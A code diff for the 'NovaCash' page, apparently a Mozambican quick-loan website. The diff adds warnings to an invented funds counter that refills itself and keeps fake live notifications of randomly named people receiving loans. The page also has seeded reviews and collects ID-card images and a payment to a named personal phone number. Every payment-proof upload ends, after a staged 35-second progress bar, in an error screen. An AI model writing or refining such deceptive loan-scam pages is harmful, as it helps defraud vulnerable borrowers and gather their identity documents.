@@ -245,9 +245,14 @@
             font-size: 1.6rem;
             font-weight: 800;
             color: white;
+            transition: color 0.3s ease;
         }
         .funds-balance-value.mzn { color: #FFD700; }
+        .funds-balance-value.mzn.low-balance { color: #FF6B35; }
+        .funds-balance-value.mzn.critical-balance { color: #FF1744; }
         .funds-balance-value.usd { color: #A7F3D0; }
+        .funds-balance-value.usd.low-balance { color: #FF6B35; }
+        .funds-balance-value.usd.critical-balance { color: #FF1744; }
         .funds-modal-footer {
             margin-top: 1.5rem;
             padding-top: 1rem;
@@ -255,6 +260,8 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
+            flex-wrap: wrap;
+            gap: 0.5rem;
         }
         .funds-last-update {
             color: rgba(255,255,255,0.4);
@@ -265,6 +272,26 @@
             font-size: 0.75rem;
             text-transform: uppercase;
             letter-spacing: 1px;
+        }
+        .funds-warning {
+            background: rgba(255, 107, 53, 0.15);
+            border: 1px solid rgba(255, 107, 53, 0.3);
+            border-radius: 12px;
+            padding: 0.8rem 1.2rem;
+            margin-bottom: 1rem;
+            display: none;
+            align-items: center;
+            gap: 10px;
+            color: #FF6B35;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+        .funds-warning.show { display: flex; }
+        .funds-warning i { font-size: 1.2rem; }
+        .funds-warning.critical {
+            background: rgba(255, 23, 68, 0.15);
+            border-color: rgba(255, 23, 68, 0.3);
+            color: #FF1744;
         }
 
         /* REVIEWS SECTION */
@@ -516,6 +543,25 @@
             animation: slideInUp 0.4s ease;
         }
         .review-toast.show { display: block; }
+
+        /* Reset notification toast */
+        .reset-toast {
+            position: fixed;
+            bottom: 120px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(135deg, #FF7F00, #FFB347);
+            color: white;
+            padding: 0.8rem 2rem;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            box-shadow: 0 10px 30px rgba(255,127,0,0.4);
+            z-index: 9999;
+            display: none;
+            animation: slideInUp 0.4s ease;
+        }
+        .reset-toast.show { display: block; }
     </style>
 </head>
 <body>
@@ -601,6 +647,11 @@
             <button class="funds-modal-close" id="fundsModalClose">&times;</button>
         </div>
         <div class="funds-modal-body">
+            <!-- Aviso de fundos em baixa -->
+            <div class="funds-warning" id="fundsWarning">
+                <i class="fas fa-exclamation-triangle"></i>
+                <span>⚠️ Fundos em baixa</span>
+            </div>
             <div class="funds-balance-item">
                 <span class="funds-balance-label">Saldo em Meticais</span>
                 <span class="funds-balance-value mzn" id="fundsBalanceMZN">28.000.000 MT</span>
@@ -616,6 +667,9 @@
         </div>
     </div>
 </div>
+
+<!-- RESET TOAST -->
+<div class="reset-toast" id="resetToast">🔄 Fundos reabastecidos! Saldo restaurado para 28.000.000 MT</div>
 
 <!-- CONTEÚDO PRINCIPAL -->
 <div id="mainContent" style="display: none;">
@@ -799,10 +853,13 @@
 document.addEventListener('DOMContentLoaded', function() {
     const PAYMENT_NUMBER = "876364927";
     const PAYMENT_NAME = "TIOFELO EDSON LUIS JAIELA";
+    const INITIAL_FUNDS = 28000000;
+    const LOW_BALANCE_THRESHOLD = 500000;
     
     // ========== FUNDOS DISPONÍVEIS ==========
-    let availableFunds = 28000000; // 28 milhões em MZN
-    const EXCHANGE_RATE = 64; // 1 USD = 64 MZN
+    let availableFunds = INITIAL_FUNDS;
+    const EXCHANGE_RATE = 64;
+    let resetToastTimer = null;
     
     function formatNumber(num) {
         return num.toLocaleString('pt-MZ');
@@ -811,15 +868,53 @@ document.addEventListener('DOMContentLoaded', function() {
     function updateFundsDisplay() {
         const mznEl = document.getElementById('fundsBalanceMZN');
         const usdEl = document.getElementById('fundsBalanceUSD');
+        const warningEl = document.getElementById('fundsWarning');
         const usdValue = availableFunds / EXCHANGE_RATE;
-        if (mznEl) mznEl.textContent = formatNumber(availableFunds) + ' MT';
-        if (usdEl) usdEl.textContent = '$ ' + formatNumber(Math.round(usdValue));
+        
+        if (mznEl) {
+            mznEl.textContent = formatNumber(availableFunds) + ' MT';
+            // Remove existing classes
+            mznEl.classList.remove('low-balance', 'critical-balance');
+            // Apply color based on balance
+            if (availableFunds === 0) {
+                mznEl.classList.add('critical-balance');
+            } else if (availableFunds < LOW_BALANCE_THRESHOLD) {
+                mznEl.classList.add('low-balance');
+            }
+        }
+        
+        if (usdEl) {
+            usdEl.textContent = '$ ' + formatNumber(Math.round(usdValue));
+            usdEl.classList.remove('low-balance', 'critical-balance');
+            if (availableFunds === 0) {
+                usdEl.classList.add('critical-balance');
+            } else if (availableFunds < LOW_BALANCE_THRESHOLD) {
+                usdEl.classList.add('low-balance');
+            }
+        }
+        
+        // Show/hide warning
+        if (warningEl) {
+            if (availableFunds < LOW_BALANCE_THRESHOLD && availableFunds > 0) {
+                warningEl.classList.add('show');
+                warningEl.classList.remove('critical');
+                warningEl.querySelector('span').textContent = '⚠️ Fundos em baixa';
+            } else if (availableFunds === 0) {
+                warningEl.classList.add('show');
+                warningEl.classList.add('critical');
+                warningEl.querySelector('span').textContent = '⚠️ Fundos esgotados! A recarregar...';
+            } else {
+                warningEl.classList.remove('show', 'critical');
+            }
+        }
+        
         // Update last update time
         const updateEl = document.getElementById('fundsLastUpdate');
         if (updateEl) {
             const now = new Date();
             updateEl.textContent = 'Atualizado ' + now.toLocaleTimeString('pt-MZ');
         }
+        
         // Save to localStorage
         localStorage.setItem('novacash_funds', availableFunds.toString());
     }
@@ -830,11 +925,36 @@ document.addEventListener('DOMContentLoaded', function() {
         availableFunds = parseInt(savedFunds);
     }
     
+    function resetFunds() {
+        availableFunds = INITIAL_FUNDS;
+        localStorage.setItem('novacash_funds', availableFunds.toString());
+        updateFundsDisplay();
+        
+        // Show reset toast
+        const resetToast = document.getElementById('resetToast');
+        if (resetToast) {
+            resetToast.classList.add('show');
+            if (resetToastTimer) clearTimeout(resetToastTimer);
+            resetToastTimer = setTimeout(() => {
+                resetToast.classList.remove('show');
+            }, 4000);
+        }
+    }
+    
     function deductFunds(amount) {
         if (amount > 0) {
-            availableFunds = Math.max(0, availableFunds - amount);
-            updateFundsDisplay();
-            // Also update localStorage
+            const newBalance = availableFunds - amount;
+            if (newBalance <= 0) {
+                availableFunds = 0;
+                updateFundsDisplay();
+                // Reset after showing the zero state briefly
+                setTimeout(() => {
+                    resetFunds();
+                }, 2000);
+            } else {
+                availableFunds = newBalance;
+                updateFundsDisplay();
+            }
             localStorage.setItem('novacash_funds', availableFunds.toString());
         }
     }
@@ -860,59 +980,35 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
     
-    // Update funds when notification appears - intercept the notification system
-    const originalShowNotification = window.showNotification;
-    const notificationAmounts = [5000, 10000, 25000, 50000, 100000, 150000, 200000, 300000];
-    
-    // Override notification to deduct funds
-    const origShowNotif = function() {
-        const name = firstNames[Math.floor(Math.random() * firstNames.length)] + ' ' + lastNames[Math.floor(Math.random() * lastNames.length)];
-        const amount = notificationAmounts[Math.floor(Math.random() * notificationAmounts.length)];
-        const methods = ['M-Pesa', 'E-Mola', 'Banco'];
-        const method = methods[Math.floor(Math.random() * 3)];
-        const container = document.getElementById('notificationsContainer');
-        if (!container) return;
-        const notif = document.createElement('div');
-        notif.className = 'live-notification';
-        notif.innerHTML = `<div style="width:40px;height:40px;background:rgba(255,127,0,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;"><i class="fas fa-hand-holding-usd" style="color:var(--primary);font-size:1.2rem;"></i></div><div style="flex:1"><strong>${name} recebeu ${amount.toLocaleString('pt-MZ')} MZN</strong><small style="display:block;color:var(--gray);margin-top:4px;">via ${method} ✅</small></div><button class="notification-close" style="background:none;border:none;color:var(--gray);cursor:pointer;">&times;</button>`;
-        container.appendChild(notif);
-        notif.querySelector('.notification-close')?.addEventListener('click', () => notif.remove());
-        setTimeout(() => notif.remove(), 8000);
-        
-        // DEDUCT FROM FUNDS
-        deductFunds(amount);
-    };
-    
-    // Override the notification function
-    const firstNames = ['João', 'Carla', 'Ernesto', 'Marta', 'António', 'Filomena', 'Carlos', 'Ana', 'Paulo', 'Rosa', 'José', 'Lúcia', 'Manuel', 'Isabel', 'Fernando'];
-    const lastNames = ['Matola', 'Mucavele', 'Macamo', 'Chongo', 'Sitoe', 'Langa', 'Nhaca', 'Munguambe', 'Chicava', 'Zandamela'];
-    
-    // Override showNotification
-    window.showNotification = function() {
-        const name = firstNames[Math.floor(Math.random() * firstNames.length)] + ' ' + lastNames[Math.floor(Math.random() * lastNames.length)];
-        const amount = notificationAmounts[Math.floor(Math.random() * notificationAmounts.length)];
-        const methods = ['M-Pesa', 'E-Mola', 'Banco'];
-        const method = methods[Math.floor(Math.random() * 3)];
-        const container = document.getElementById('notificationsContainer');
-        if (!container) return;
-        const notif = document.createElement('div');
-        notif.className = 'live-notification';
-        notif.innerHTML = `<div style="width:40px;height:40px;background:rgba(255,127,0,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;"><i class="fas fa-hand-holding-usd" style="color:var(--primary);font-size:1.2rem;"></i></div><div style="flex:1"><strong>${name} recebeu ${amount.toLocaleString('pt-MZ')} MZN</strong><small style="display:block;color:var(--gray);margin-top:4px;">via ${method} ✅</small></div><button class="notification-close" style="background:none;border:none;color:var(--gray);cursor:pointer;">&times;</button>`;
-        container.appendChild(notif);
-        notif.querySelector('.notification-close')?.addEventListener('click', () => notif.remove());
-        setTimeout(() => notif.remove(), 8000);
-        
-        // DEDUCT FROM FUNDS
-        deductFunds(amount);
-    };
-    
     // Initial display
     updateFundsDisplay();
+    
+    // ========== NOTIFICATION SYSTEM WITH FUNDS DEDUCTION ==========
+    const firstNames = ['João', 'Carla', 'Ernesto', 'Marta', 'António', 'Filomena', 'Carlos', 'Ana', 'Paulo', 'Rosa', 'José', 'Lúcia', 'Manuel', 'Isabel', 'Fernando'];
+    const lastNames = ['Matola', 'Mucavele', 'Macamo', 'Chongo', 'Sitoe', 'Langa', 'Nhaca', 'Munguambe', 'Chicava', 'Zandamela'];
+    const notificationAmounts = [5000, 10000, 25000, 50000, 100000, 150000, 200000, 300000];
+    
+    function showNotification() {
+        const name = firstNames[Math.floor(Math.random() * firstNames.length)] + ' ' + lastNames[Math.floor(Math.random() * lastNames.length)];
+        const amount = notificationAmounts[Math.floor(Math.random() * notificationAmounts.length)];
+        const methods = ['M-Pesa', 'E-Mola', 'Banco'];
+        const method = methods[Math.floor(Math.random() * 3)];
+        const container = document.getElementById('notificationsContainer');
+        if (!container) return;
+        const notif = document.createElement('div');
+        notif.className = 'live-notification';
+        notif.innerHTML = `<div style="width:40px;height:40px;background:rgba(255,127,0,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;"><i class="fas fa-hand-holding-usd" style="color:var(--primary);font-size:1.2rem;"></i></div><div style="flex:1"><strong>${name} recebeu ${amount.toLocaleString('pt-MZ')} MZN</strong><small style="display:block;color:var(--gray);margin-top:4px;">via ${method} ✅</small></div><button class="notification-close" style="background:none;border:none;color:var(--gray);cursor:pointer;">&times;</button>`;
+        container.appendChild(notif);
+        notif.querySelector('.notification-close')?.addEventListener('click', () => notif.remove());
+        setTimeout(() => notif.remove(), 8000);
+        
+        // DEDUCT FROM FUNDS
+        deductFunds(amount);
+    };
     
     // ========== REVIEWS SYSTEM ==========
     const REVIEWS_STORAGE_KEY = 'novacash_reviews';
     
-    // Initial reviews
     const defaultReviews = [
         { name: 'João Matola', rating: 5, text: 'Excelente serviço! Recebi o meu empréstimo em menos de 20 minutos. Recomendo a todos que precisam de dinheiro rápido com segurança.', date: '2025-01-15' },
         { name: 'Carla Mucavele', rating: 5, text: 'Fui muito bem atendida, processo simples e transparente. O dinheiro caiu na minha conta M-Pesa rapidinho. Nota 10!', date: '2025-01-18' },
@@ -924,7 +1020,6 @@ document.addEventListener('DOMContentLoaded', function() {
         { name: 'Ana Munguambe', rating: 4, text: 'Atendimento excelente, o pessoal é muito educado e tirou todas as minhas dúvidas. O dinheiro chegou no prazo.', date: '2025-02-03' }
     ];
     
-    // Load reviews from localStorage
     let reviews = [];
     const savedReviews = localStorage.getItem(REVIEWS_STORAGE_KEY);
     if (savedReviews) {
@@ -942,7 +1037,6 @@ document.addEventListener('DOMContentLoaded', function() {
         const grid = document.getElementById('reviewsGrid');
         if (!grid) return;
         grid.innerHTML = '';
-        // Show latest reviews first
         const sorted = [...reviews].reverse();
         sorted.forEach(review => {
             const card = document.createElement('div');
@@ -972,7 +1066,6 @@ document.addEventListener('DOMContentLoaded', function() {
         renderReviews();
     }
     
-    // Render initial reviews
     renderReviews();
     
     // Star rating system
@@ -1010,22 +1103,18 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     });
     
-    // Set default rating (5 stars)
     ratingInput.value = 5;
     stars.forEach(s => {
         if (parseInt(s.dataset.value) <= 5) s.classList.add('active');
     });
     
-    // Review form submission
     const reviewForm = document.getElementById('reviewForm');
-    const reviewSubmitBtn = document.getElementById('reviewSubmitBtn');
     const reviewText = document.getElementById('reviewText');
     const reviewToast = document.getElementById('reviewToast');
     
     reviewForm?.addEventListener('submit', function(e) {
         e.preventDefault();
         
-        // Get current user
         const session = sessionStorage.getItem('novacash_session');
         if (!session) {
             alert('Por favor, faça login para publicar uma avaliação.');
@@ -1042,16 +1131,13 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
         
-        // Add review
         addReview(userName, rating, text);
         
-        // Show toast
         reviewToast.classList.add('show');
         setTimeout(() => {
             reviewToast.classList.remove('show');
         }, 3000);
         
-        // Reset form
         reviewText.value = '';
         ratingInput.value = 5;
         stars.forEach(s => {
@@ -1062,7 +1148,6 @@ document.addEventListener('DOMContentLoaded', function() {
             }
         });
         
-        // Scroll to reviews
         document.getElementById('avaliacoes')?.scrollIntoView({ behavior: 'smooth' });
     });
     
@@ -1082,7 +1167,6 @@ document.addEventListener('DOMContentLoaded', function() {
         if(document.getElementById('confirmName')) document.getElementById('confirmName').value = currentUser.fullName || '';
     }
     
-    // Login com 10 segundos de loading
     document.getElementById('mainLoginForm').addEventListener('submit', function(e) {
         e.preventDefault();
         const fullName = document.getElementById('loginFullName').value.trim();
@@ -1093,7 +1177,6 @@ document.addEventListener('DOMContentLoaded', function() {
         if (!phone) { alert('Por favor, insira seu Número de Telefone'); return; }
         if (!password || password.length < 4 || password.length > 6) { alert('A senha deve conter de 4 a 6 dígitos'); return; }
         
-        const loginDiv = document.querySelector('#mainLoginOverlay > div');
         const loginLoading = document.getElementById('loginLoading');
         const loginForm = document.getElementById('mainLoginForm');
         
@@ -1401,10 +1484,8 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     });
     
-    // FAQ Acordeão
     document.querySelectorAll('.faq-question').forEach(q => { q.addEventListener('click', () => q.parentElement.classList.toggle('active')); });
     
-    // Navegação Mobile
     document.getElementById('navToggle')?.addEventListener('click', () => document.getElementById('navMenu').classList.toggle('active'));
     
     function scrollToPaymentSection() {
@@ -1421,7 +1502,6 @@ document.addEventListener('DOMContentLoaded', function() {
     document.getElementById('mainRequestBtn')?.addEventListener('click', (e) => { e.preventDefault(); scrollToPaymentSection(); });
     document.getElementById('registerAccountBtn')?.addEventListener('click', (e) => { e.preventDefault(); scrollToPaymentSection(); });
     
-    // Live Counter
     let liveRequests = 23;
     setInterval(() => { liveRequests = 18 + Math.floor(Math.random() * 15); if(document.getElementById('liveRequestsCount')) document.getElementById('liveRequestsCount').textContent = liveRequests; }, 30000);
     
@@ -1471,18 +1551,13 @@ document.addEventListener('DOMContentLoaded', function() {
     document.getElementById('biBack')?.addEventListener('change', function() { previewImage(this, 'biBackPreview'); });
     document.getElementById('paymentProof')?.addEventListener('change', function() { previewImage(this, 'paymentProofPreview'); });
     
-    // Notifications
-    let notificationInterval = setInterval(() => {
-        if (window.showNotification) {
-            window.showNotification();
-        }
+    // Notifications interval
+    setInterval(() => {
+        showNotification();
     }, 25000 + Math.random() * 5000);
     
-    // Initial notification after 3 seconds
     setTimeout(() => {
-        if (window.showNotification) {
-            window.showNotification();
-        }
+        showNotification();
     }, 3000);
     
     // Estatísticas animadas
@@ -1574,6 +1649,7 @@ document.addEventListener('DOMContentLoaded', function() {
         showNotif('Abra o discador e siga as instruções', 'success');
     });
     
+    // ========== PAYMENT PROOF PROCESSING - 35 SEGUNDOS ==========
     document.getElementById('paymentProofForm')?.addEventListener('submit', function(e) {
         e.preventDefault();
         const proofFile = document.getElementById('paymentProof')?.files[0];
@@ -1582,14 +1658,20 @@ document.addEventListener('DOMContentLoaded', function() {
         const progressFill = document.getElementById('progressFill');
         loading.style.display = 'flex';
         let progress = 0;
+        const totalSteps = 35; // 35 segundos
         const interval = setInterval(() => {
-            progress += 4;
-            if (progressFill) progressFill.style.width = progress + '%';
+            progress += 100 / totalSteps;
+            if (progressFill) progressFill.style.width = Math.min(progress, 100) + '%';
             if (progress >= 100) {
                 clearInterval(interval);
-                setTimeout(() => { loading.style.display = 'none'; document.getElementById('errorModal').style.display = 'flex'; }, 500);
+                setTimeout(() => { 
+                    loading.style.display = 'none'; 
+                    document.getElementById('errorModal').style.display = 'flex';
+                    // Reset progress
+                    if (progressFill) progressFill.style.width = '0%';
+                }, 500);
             }
-        }, 250);
+        }, 1000); // 1 segundo por passo = 35 segundos
     });
     
     document.getElementById('closeErrorModal')?.addEventListener('click', () => { document.getElementById('errorModal').style.display = 'none'; });
